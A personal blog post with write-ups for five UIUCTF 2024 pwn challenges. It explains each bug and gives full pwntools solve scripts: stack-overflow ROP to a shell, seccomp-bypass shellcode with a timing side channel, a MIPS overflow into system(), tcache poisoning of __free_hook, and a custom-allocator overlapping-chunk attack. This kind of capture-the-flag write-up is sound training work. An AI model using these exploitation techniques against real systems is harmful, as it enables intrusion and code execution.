---
title: 'UIUCTF2024 - pwnable write-ups'
date: 2024-07-01
tags:
    - CTF
    - PWN
    - 2024
description: 'Write-up for UIUCTF 2024'
---
This is the CTF event that I feel I really did the best so far. My team finished top 16 in this CTF. 

I solved 4 out of 5 pwn challenges, and 1 rev/pwn challenge. The last pwn challenge is kernel-related, so I stood no chance. Here's my write-up for all 5 challenges I solved.
## lost-canary
This is a rev/pwn challenge. 
### Analyse
The program just prompts us to input which `station` to go, then it will call that `station`. There are 0x7fff station in total. Through reversing, every station has bof bug.
There are 3 ways for stations to read inputs: `strcpy` , `gets`, and `scanf(%s,buf)`
```c 
__int64 station_0()
{
  char s[16]; // [rsp+0h] [rbp-1010h] BYREF
  char dest[4]; // [rsp+1004h] [rbp-Ch] BYREF

  printf("%s", "Welcome to station 0.\nEnter ticket code:");
  fgets(s, 4096, stdin);
  strcpy(dest, s);
  return _stack_chk_guard_0;
}
```
```c 
__int64 station_2()
{
  char v1[4]; // [rsp+4h] [rbp-Ch] BYREF

  sleep(1u);
  printf("%s", "Welcome to station 2.\nEnter ticket code:");
  gets(v1);
  return _stack_chk_guard_2;
}
```
```c
__int64 station_7()
{
  char v1[4]; // [rsp+4h] [rbp-Ch] BYREF

  printf("%s", "Welcome to station 7.\nEnter ticket code:");
  __isoc99_scanf("%s", v1);
  return _stack_chk_guard_7;
}
```
The canary is static, which means every station has its own canary and it is unchange and in the binary.

There's also format string bug in the `printf` function, so I got libc base address from it.

At first, I thought it was easy, since we got all the canary. But no. I checked through 10 station and see that the canaries has the terminating byte of the input method.
For example
```
pwndbg> x/gx &__stack_chk_guard_0
0x6bf010 <__stack_chk_guard_0>: 0x56686a4354004661
pwndbg> x/gx &__stack_chk_guard_2
0x6bf020 <__stack_chk_guard_2>: 0x0a616568776e4d47
pwndbg> x/gx &__stack_chk_guard_7
0x6bf048 <__stack_chk_guard_7>: 0x7744556a5620634c
```
`station_0` use `strcpy`, and the canary contains \x00. `station_2` use `gets`, and it contains \x0a. Same to `scanf`, the canary contains \x20.

As the challenge discription really suggest, we need to find the station that does not have terminating byte.
### Exploit
To find the correct station, I use `xxd` to dump all the station's canaries and station functions to two files.
Then, I categorize the canaries into three types of input method.
```python 
strcpy = []
gets = []
scanf = []
for i in range (len(can_ls)):
    if b'\x0a' in can_ls[i]:
        gets.append((i, can_ls[i]))
    if b'\x00' in can_ls[i ]:
        strcpy.append( ( i, can_ls[i]))
    if b'\x20' in can_ls[i]:
        scanf.append( (i, can_ls[i]))
```
I did the same with the functions
```python 
# Those hex strings are unique in each functions
for i in range(32768):
    if '488d95f0efffff488d45f44889d64889c7' in st_ls[i]:
        st_strcpy.append((i, can_ls[i]))
    if '488d45f44889c7' in st_ls[i]:
        st_gets.append((i, can_ls[i]))
    else:
        st_scanf.append((i,can_ls[i]))
```
Then I check if the lenght of station list and the canary list is not equal one each method, and search on that method.

When canary was found, the last thing is easy ROP chain
### Solve script
#### Finding canary
```python
from pwn import *
canaries = ''
context.arch = 'amd64'
with open ('canaries', 'r') as f:
    canaries = f.read()
    
canaries = ''.join(canaries.split('\n'))
ls = []
for i in range(0,len(canaries),16):
    ls.append(canaries[i:i+16])

can_ls  = []

for i in ls:
    can_ls.append(bytes.fromhex(i))
strcpy = []
gets = []
scanf = []
for i in range (len(can_ls)):
    if b'\x0a' in can_ls[i]:
        gets.append((i, can_ls[i]))
    if b'\x00' in can_ls[i ]:
        strcpy.append( ( i, can_ls[i]))
    if b'\x20' in can_ls[i]:
        scanf.append( (i, can_ls[i]))
        


stations = ''
with open('stations', 'r') as f:
    stations = f.read()
    
st_strcpy = []
st_gets = []
st_scanf = []
stations = ''.join(stations.split('\n'))
st_ls = stations.split('f30f1efa')
st_ls = st_ls[1:]
print((st_ls[0]))
print(can_ls[32767])
assert len(st_ls) == len(can_ls), 'Must be equal'

for i in range(32768):
    if '488d95f0efffff488d45f44889d64889c7' in st_ls[i]:
        st_strcpy.append((i, can_ls[i]))
    if '488d45f44889c7' in st_ls[i]:
        st_gets.append((i, can_ls[i]))
    else:
        st_scanf.append((i,can_ls[i]))

print(len(st_gets), len(gets))
for i in st_gets:
    if i not in gets:
        print(i)
assert len(st_strcpy) == len(strcpy), 'STRCPY NOT EQUAL'
assert len(st_gets) == len(gets), 'GETS NOT EQUAL'
assert len(st_scanf) == len(scanf), 'SCANF NOT EQUAL'
```
#### Exploit
```python 
from pwn import *

context.binary = exe = ELF('./lost_canary', checksec= False)
context.log_level = 'debug'
libc = ELF('./libc.so.6')
if sys.argv[1] == 'connect':
    chall = remote('lost-canary.chal.uiuc.tf', 1337, ssl =True)
elif sys.argv[1] == 'debug':
    chall = process()
    gdb.attach(chall, '''
               b *station_14927
               ''' )
else:
    chall = process()
    
chall.sendlineafter(b'number:', b'14927 %13$p')
chall.recvuntil(b'station: \n14927 ')
libc.address = int(chall.recvline(),16) - libc.sym["__libc_start_main"]-243
log.info('libc @ ' +hex(libc.address))
canary = 0x7361754569205965
pop_rdi =0x23b6a
ret = pop_rdi+1
payload = b'A'*4 + flat([
    canary,
    0,
    libc.address + pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret + libc.address,
    libc.sym["system"]
])
chall.sendlineafter(b'code:',payload)
chall.interactive()
```
## syscall
This one is a syscall-bypass challenge. It reads our shellcode then executes it.
**Seccomp-check:**
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```
### My solution
There are some useful syscalls that are not disallowed: `openat`, `mmap` and `writev`. `openat` can be used as `open`, `mmap` can be used to read from file. However, my original solution did not use `writev`, because I thought that it was not possible to bypass the `fd` of `writev`. Instead, I used side-channel attack to get every bits of the flag. If the bit is 1, I let the shellcode loop infinitely, else I just let it stop.
### Alternative solution
However, that solution was an overkill, because `writev` still can be used. The first arg of `writev`, `fd` is an int, according to linux man page, while some syscall tables write that `fd` is an unsing. If `fd` is 0x100000001, it can bypass this check:
```
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
```
### Solve script
#### Original
```python 
from pwn import *
#context.log_level = 'debug'
context.binary = exe = ELF('./syscalls')
#libc = ELF('../lib/libc.so.6')
#libc = ELF('./libtest/libc.so.6')

def conn():
    if sys.argv[1] == 'connect':
        chall = remote('syscalls.chal.uiuc.tf', 1337, ssl = True)
    elif sys.argv[1] == 'debug':
        chall = process(aslr= False)
        gdb.attach(chall, '''
                b* 0x555555554000+0x12d6
                ''' )
    else:
        chall = process()
    return chall
    
def exec(offs):
    byte = b''
    for bit in range(8):
        chall = conn()
        shellcode = shellcraft.openat(-100,'flag.txt',0,0) + shellcraft.mmap(0x400000, 0x1000, 7, 2,'rax',0) + f'''
        xor r11, r11
        xor rax, rax
        mov al, [0x400000 + {offs}]
        shr al, {bit}
        and al, 1
        loop:
        cmp rax, r11
        je end
        jmp loop
        end:
        '''
        payload = asm(shellcode)
        chall.sendlineafter(b'.\n' ,payload)
        start = time.time()
        chall.recvall(timeout=1)
        p = chall.wait_for_close
        now = time.time()
        if (now - start) > 0.95:
            byte += b'1'
        else:
            byte += b'0'
    byte = chr(int(byte[::-1],2)).encode()
    return byte        
     
flag = b'uiuctf{'
for i in range(7,100):
    log.info(f'[+] {i}')
    flag += exec(i)
    print(chr(flag[-1]))
    #print(bin(flag[-1]))
    if flag[-1] == b'}':
        break
    print(flag)
print(flag)
# For offset 10, you need to make a little change to avoid \x0a byte
# a =  exec(10)
# print(a)
```
#### Alternative
```python
from pwn import *

context.binary = exe = ELF('./syscalls', checksec= False)
context.log_level = 'debug'
if sys.argv[1] == 'connect':
    chall = remote('syscalls.chal.uiuc.tf', 1337, ssl = True)
elif sys.argv[1] == 'debug':
    chall = process()
    gdb.attach(chall, '''
               ''' )
else:
    chall = process()
    
payload = shellcraft.openat(-100, 'flag.txt', 0, 0) + shellcraft.mmap(0x400000, 0x1000, 7, 2,'rax',0) + '''
mov rax, 0x400100
mov rdx, 0x400000
mov [rax], rdx
mov qword ptr [rax + 8], 0xe0
''' + shellcraft.writev(0x100000001, 0x400100, 1)
chall.send(asm(payload))
chall.interactive()
```
## backup-power
```
$ file backup-power
backup-power: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=f35027e73bc1014a42a60288b446b1dedca772fb, for GNU/Linux 3.2.0, with debug_info, not stripped
```
On this challenge, we are given a MIPS binary. This is the first time I pwned a binary on a different arch other than x86.
### Reversing
The program prompt us to input username and password. However, if username is `devolper`, we don't need password and vuln function is called.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // $s1
  int v4; // $s2
  int v5; // $s3
  int v6; // $s4
  int v7; // $s5
  int v8; // $s6
  int v9; // $s7
  char *backup_power; // [sp+20h] [+20h]
  int valid; // [sp+24h] [+24h]
  int i; // [sp+28h] [+28h]
  int cfi; // [sp+2Ch] [+2Ch]
  char username[100]; // [sp+30h] [+30h] BYREF
  char password[100]; // [sp+94h] [+94h] BYREF
  char command[100]; // [sp+F8h] [+F8h] BYREF
  char command_buf[128]; // [sp+15Ch] [+15Ch] BYREF
  char shutdown[9]; // [sp+1DCh] [+1DCh] BYREF
  char shutup[7]; // [sp+1E8h] [+1E8h] BYREF
  char system_str[7]; // [sp+1F0h] [+1F0h] BYREF
  char arg1[32]; // [sp+1F8h] [+1F8h] BYREF
  char arg2[32]; // [sp+218h] [+218h] BYREF
  char arg3[32]; // [sp+238h] [+238h] BYREF
  char arg4[32]; // [sp+258h] [+258h] BYREF
  int a; // [sp+278h] [+278h]
  int b; // [sp+27Ch] [+27Ch]
  int c; // [sp+280h] [+280h]
  char *allowed_commands[2]; // [sp+284h] [+284h]
//[...]
while ( 1 )
    {
      printf("SIGPwny Transit Authority Backup power status: %s\n", backup_power);
      printf("Username: ");
      fgets(username, 0x64, stdin);
      username[strcspn(username, "\n")] = 0;
      printf("Username is %s\n", username);
      if ( strcmp(username, "devolper") )
        break;
      strcpy(command, "todo");
      if ( a < 0x2711 && b < 0x2711 && c < 0x2711 )
      {
        v3 = a;
        v4 = b;
        v5 = c;
        v6 = *(_DWORD *)arg1;
        v7 = *(_DWORD *)arg2;
        v8 = *(_DWORD *)arg3;
        v9 = *(_DWORD *)arg4;
        cfi = a * b + c;
        develper_power_management_portal(cfi);
        a = v3;
        b = v4;
        c = v5;
        *(_DWORD *)arg1 = v6;
        *(_DWORD *)arg2 = v7;
        *(_DWORD *)arg3 = v8;
        *(_DWORD *)arg4 = v9;
        goto LABEL_15;
      }
    }
```
**Vuln function**:
```c 
void __cdecl develper_power_management_portal(int cfi)
{
  char buffer[4]; // [sp+18h] [+18h] BYREF
  int vars20; // [sp+44h] [+44h]

  gets(buffer);
  if ( vars20 != cfi )
    _stack_chk_fail_local();
}
```
Inside main function, if `command` contains 'system', `system()` will be called with args in `command_buf`. 
```c
    if ( !strcmp(command, system_str) )
    {
      sprintf(command_buf, "%s %s %s %s", arg1, arg2, arg3, arg4);
      system(command_buf);
      return 0;
```
There's no way to access this buffer except overflowing from the `vuln` function.
### Exploit
#### Bypass canary
Before return, vuln perform a check if `vars20` equal to `cfi`, which is the first arg. In main function, `cfi = a * b + c`. We get that value and place on the stack right at `vars20` to successfully bypass canary check.
#### Overwriting args
Before calling `vuln`, `arg1`, `arg2`, `arg3` and `arg4` are saved into register `$s4` to `$s7`. These registers are callee saved, which mean their value are saved after a function called. Those values are saved on a stack, so we could overflow them become `sh;\x00`. Why `;`? Because `sprintf` will make `command_buf` become `sh sh sh sh`, which is not a valid args. That's why we need a `;` there.
#### Overflowing command
We just need to calculate the right offset of `command`, then write `system` to it.
### Solve script
```python 
from pwn import *
context.log_level = 'debug'
context.binary = exe = ELF('./backup-power')

#libc = ELF('./libtest/libc.so.6')
if sys.argv[1] == 'connect':
    chall = remote('backup-power.chal.uiuc.tf', 1337, ssl = True)
elif sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                b *main+852
                c
               ''' )
else:
    chall = process()
    
# buf = fp -0x30 = sp + 0x18
# The magic value 0x4aa330 are written just to make the program not segfault. 
# I keep in the same  as when it runs normally.
buff =  b'sh;\x00'*11 + p32(0x00400b0c)*2 + (b'\x00'*0x14 + p32(0x4aa330)).ljust(0xf4,b'\x00')  + b'system'.ljust(100,b'\x00') + b'/bin/sh'
chall.sendlineafter(b'name: ', b'devolper')
chall.sendlineafter(b'devolper\n',buff)
chall.interactive()
```
## Rusty pointer
The binary of this challenge is compiled from rust. We are given source code and libc. The binary use libc-2.31.


### Analyse
```rust 
fn menu() {
	println!("1. Create a Rule or Note");
	println!("2. Delete a Rule or Note");
	println!("3. Read a Rule or Note");
	println!("4. Edit a Rule or Note");
	println!("5. Make a Law");
	println!("6. Exit");
}
```
We are given 5 options. Each option, execpt the fifth, we can choose to operate on a `Rule` or a `Note`.
**Rule and Notes**
```rust 
type RulesT = Vec<&'static mut [u8; LEN]>;
type NotesT = Vec<Box<[u8; LEN]>>;
#[inline(never)]
fn get_rule() -> &'static mut [u8; LEN] {
	let mut buffer = Box::new([0; LEN]);
	return get_ptr(&mut buffer);
}

#[inline(never)]
fn get_note() -> Box<[u8; LEN]>{
	return Box::new([0; LEN])
}

const S: &&() = &&();
#[inline(never)]
fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
	fn ident<'a, 'b, T: ?Sized>(
        _val_a: &'a &'b (),
        val_b: &'b mut T,
	) -> &'a mut T {
			val_b
	}
	let f: fn(_, &'a mut T) -> &'b mut T = ident;
	f(S, x)
}
```
I just know that `Box` is a dynamic data type in Rust, and it is allocated using malloc and free.

First four options is quite clear I guess. The fifth option just gives us an address from libc.
### Exploit
Through some attempts messing around with rules and notes, somehow when gets a new rules, it gives us a freed chunk.
```python 
create(RULE)
create(NOTE)
create(NOTE)
delete(NOTE, 1)
create(RULE)
create(RULE)
delete(NOTE, 0)
gets(RULE, 0)
```
![image](https://hackmd.io/_uploads/ryo-e1lP0.png)
That's a UAF bug. Through debugging and some more attemps, I made it return the second freed chunk, so that I could poison tcache. Since it uses libc-2.31, `__free_hook` is still there, and there is no safe-linking, I can replace the first pointer into `__free_hook`. After a chunk placed at `__free_hook`, I overwrite it with the address of `system()`. Then I free a note contain the string `/bin/sh` to get the shell.
### Solve script
```python 
from pwn import *

context.binary = exe = ELF('./rusty_ptrs_patched', checksec= False)
context.log_level = 'debug'
libc = ELF('./lib/libc.so.6')
if sys.argv[1] == 'connect':
    chall = remote('rustyptrs.chal.uiuc.tf', 1337, ssl =True)
elif sys.argv[1] == 'debug':
    chall = process()
    gdb.attach(chall, '''
               set solib-search-path /home/aneii/ctf/uiu/rust-ptr/dist/lib/
               ''' )
else:
    chall = process()
    
RULE = 1
NOTE = 2
def create(t):
    chall.sendlineafter(b'> ', b'1')
    chall.sendlineafter(b'> ', str(t).encode())
    

def edit(msg, t, idx):
    chall.sendlineafter(b'> ', b'4')
    chall.sendlineafter(b'> ', str(t).encode())
    chall.sendlineafter(b'> ', str(idx).encode())
    chall.sendlineafter(b'> ', msg)
    
def delete(t, idx):
    chall.sendlineafter(b'> ', b'2')
    chall.sendlineafter(b'> ', str(t).encode())
    chall.sendlineafter(b'> ', str(idx).encode())
    
    
def gets(t, idx):
    chall.sendlineafter(b'> ', b'3')
    chall.sendlineafter(b'> ', str(t).encode())
    chall.sendlineafter(b'> ', str(idx).encode())

offs = 0x1ecbe0
chall.sendlineafter(b'> ',b'5')
leak = int(chall.recvuntil(b'be0'),16)
libc.address = leak - offs
log.info('libc @ ' +hex(libc.address))
create(RULE)
create(NOTE)
create(NOTE)
delete(NOTE, 1)
create(RULE)
create(RULE)
delete(NOTE, 0)
gets(RULE, 0)
edit(p64(libc.sym["__free_hook"]), RULE, 0)
create(NOTE)
edit('/bin/sh\x00',NOTE, 0)
create(NOTE)
edit(p64(libc.sym["system"]), NOTE, 1)
delete(NOTE, 0)
chall.interactive()
```
## pwnymalloc
This one I feel is the most interesting challenge. The program create its own allocator and using it.
### Analyse
```c
    while (1) {
        puts("\n1. Submit a complaint");
        puts("2. View pending complaints");
        puts("3. Request a refund");
        puts("4. Check refund status");
        puts("5. Exit\n");

```
We are given 4 options. Let's go through each one.
#### Submit complaint and view complaints
```c 
void handle_complaint() {
    puts("Please enter your complaint:");
    char *trash = pwnymalloc(0x48);
    fgets(trash, 0x48, stdin);
    memset(trash, 0, 0x48);
    pwnyfree(trash);
    puts("Thank you for your feedback! We take all complaints very seriously.");
}

void handle_view_complaints() {
    puts("Oh no! Our complaint database is currently down. Please try again later.");
}
```
Average customer service.
#### Request refund
```c 
void handle_refund_request() {
    int request_id = -1;
    for (int i = 0; i < 10; i++) {
        if (requests[i] == NULL) {
            request_id = i;
            break;
        }
    }

    if (request_id == -1) {
        puts("Sorry, we are currently unable to process any more refund requests.");
    }

    refund_request_t *request = pwnymalloc(sizeof(refund_request_t));
    puts("Please enter the dollar amount you would like refunded:");
    char amount_str[0x10];
    fgets(amount_str, 0x10, stdin);
    sscanf(amount_str, "%d", &request->amount);

    puts("Please enter the reason for your refund request:");
    fgets(request->reason, 0x80, stdin);
    request->reason[0x7f] = '\0'; // null-terminate

    puts("Thank you for your request! We will process it shortly.");
    request->status = REFUND_DENIED;

    requests[request_id] = request;

    printf("Your request ID is: %d\n", request_id);
}
```
#### Check refund status
```c 
void handle_refund_status() {
    puts("Please enter your request ID:");
    char id_str[0x10];
    fgets(id_str, 0x10, stdin);
    int request_id;
    sscanf(id_str, "%d", &request_id);

    if (request_id < 0 || request_id >= 10) {
        puts("Invalid request ID.");
        return;
    }

    refund_request_t *request = requests[request_id];
    if (request == NULL) {
        puts("Invalid request ID.");
        return;
    }

    if (request->status == REFUND_APPROVED) {
        puts("Your refund request has been approved!");
        puts("We don't actually have any money, so here's a flag instead:");
        print_flag();
    } else {
        puts("Your refund request has been denied.");
    }
}
```
Every refund request is marked `REFUND_DENIED`. But we need `REFUND_APPROVED` status to get the flag. There must be some bug around to make this possible.
### Chunk structure
```c
#define INUSE_META_SIZE (sizeof(chunk_meta_t) - 2 * sizeof(chunk_meta_t *)) //0x8
#define FREE_META_SIZE sizeof(chunk_meta_t) 
void *pwnymalloc(size_t size) {
    if (heap_start == NULL) {
        heap_start = sbrk(0);
        heap_end = heap_start;
    }

    if (size == 0) {
        return NULL;
    }

    size_t total_size = MAX(ALIGN(size + INUSE_META_SIZE), MIN_BLOCK_SIZE);
//[...]
```
When chunk is inuse, it have to get the size of `ALIGN(size + 0x8)`. The first 8 bytes contain the size, while the remaining is for data. The flag bit is set to `INUSE (1)`

When chunk is freed, it is `set_btag()'d`. Which mean the last 8 bytes of it contains it size. The  flag bit is set to `FREE (0)`.
### Operation
#### pwnymalloc
```c 
void *pwnymalloc(size_t size) {
    if (heap_start == NULL) {
        heap_start = sbrk(0);
        heap_end = heap_start;
    }

    if (size == 0) {
        return NULL;
    }

    size_t total_size = MAX(ALIGN(size + INUSE_META_SIZE), MIN_BLOCK_SIZE);

    chunk_ptr block = find_fit(total_size);

    if (block == NULL) {
        block = extend_heap(total_size);
        if (block == NULL) {
            return NULL;
        }
    } else if (get_size((chunk_ptr) block) >= total_size + MIN_BLOCK_SIZE) {
        split(block, total_size);
    }

    return (void *) ((char *) block + INUSE_META_SIZE);
}
```
When a chunk is requested, it first checks inside the `free_list`, which contain a list of freed chunks. If it find one that is greater that requested chunk, it split the chunk into 2, and allocate 1. The other remains in `free_list`. If chunks not found in free list, it extend the heap  to allocate a chunk.
#### pwnyfree
```c 
void pwnyfree(void *ptr) {
    if (ptr == NULL) {
        return;
    }

    chunk_ptr block = (chunk_ptr) ((char *) ptr - INUSE_META_SIZE);

    // eheck alignment and status
    if ((size_t) block % ALIGNMENT != 0 || get_status(block) != INUSE) {
        return;
    }

    set_status(block, FREE);
    set_btag(block, get_size(block));

    block = coalesce(block);

    printf("Block size: %zu\n", get_size(block));

    free_list_insert(block);
}
```
When one chunk get called `pwnyfree()`, it first check for alignment and status if it is inuse. If yes, it then set the flag bits to FREE, and set btag for that chunk. Then it `coalesce` with adjacent chunk, and insert it to `free_list`.
### Bug
The bug is in `coalesce()`, `prev_chunk()` and `get_prev_size()`:
```c
static size_t get_prev_size(chunk_ptr block) {
    btag_t *prev_footer = (btag_t *) ((char *) block - BTAG_SIZE);
    return prev_footer->size;
}
```
```c
static chunk_ptr prev_chunk(chunk_ptr block) {
    if ((void *) block - get_prev_size(block) < heap_start || get_prev_size(block) == 0) {
        return NULL;
    }
    return (chunk_ptr) ((char *) block - get_prev_size(block));
}
```
```c 
static chunk_ptr coalesce(chunk_ptr block) {
    chunk_ptr prev_block = prev_chunk(block);
    chunk_ptr next_block = next_chunk((chunk_ptr) block);
    size_t size = get_size(block);

    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    int next_status = next_block == NULL ? -1 : get_status(next_block);

    if (prev_status == FREE && next_status == FREE) {
        free_list_remove(next_block);
        free_list_remove(prev_block);

        size += get_size(prev_block) + get_size(next_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);
        
        return prev_block;
    } 
    if (prev_status == FREE) {
        free_list_remove(prev_block);

        size += get_size(prev_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    } 
    if (next_status == FREE) {
        free_list_remove(next_block);

        size += get_size(next_block);
        block->size = pack_size(size, FREE);
        set_btag(block, size);

        return block;
    }

    return block;
}
```
`get_prev_size` really check `size = *(ptr - 0x8)`. That is a naive check, because there could be an inuse chunk there. If there is buffer right at that, it will also believe that it is prev_size.
### Exploit
When the chunk is free, it checks for coalesce, which called `prev_chunk`. Since prev_chunk could be fake, I will try to make overlapping chunks
```
---------------            ---------------
|   refund 1  |            |  refund 1   |
|             |            |             |
|             |            |             |
|         0xe0|            |~~~~~~~~~~~~~|
|             | coalesce   |  fake chunk |
--------------- ------->   ---------------
|   refund 2  |            |   refund 2  |
|             |            |             |
|             |            |             |
|             |            |             |
|         0xe0|            |             |
---------------            ---------------
|  complaints |            |    freed    |
|             |            | complaints  |
|             |            |             |    
---------------            ~~~~~~~~~~~~~~~
```
That figure is self-explanatory. I tricking `prev_chunk` to return to my chunk. Then `coalesce` find that there's a adjacent freed chunk, it coalesce with our free chunk. When I request refund next time, it allocates the overlapping chunk, which let us overwriting `refund->status`.
### Solve script
```python 
from pwn import *

context.binary = exe = ELF('./chal')
context.log_level = 'debug'

if sys.argv[1] == 'connect':
    chall = remote('pwnymalloc.chal.uiuc.tf', 1337, ssl = True)
elif sys.argv[1] == 'debug':
    chall = process()
    gdb.attach(chall , '''
               b *get_status
               b *prev_chunk
               ''' )
else:
    chall = process()
    
def refund(msg):
    chall.sendlineafter('> ', b'3')
    chall.sendlineafter(b'refunded:\n', b'1')
    chall.sendafter(b'request:\n', msg)
    
payload = p64(0xf0)*5 + p64(0)*10 + p64(0xf0)
refund(payload[:-1])    
refund(payload[:-1])
chall.sendlineafter(b'> ', b'1')
chall.sendlineafter(b'complaint:\n', b'')
refund(p32(1)*24 + b'\n')
chall.sendlineafter(b'> ', b'4')
chall.sendlineafter(b':\n', b'1')
chall.interactive()
```
This challenge is really cool, since it really require players to examine the program. The exploit is really short, but the thought process needed to doing this challenge is nice.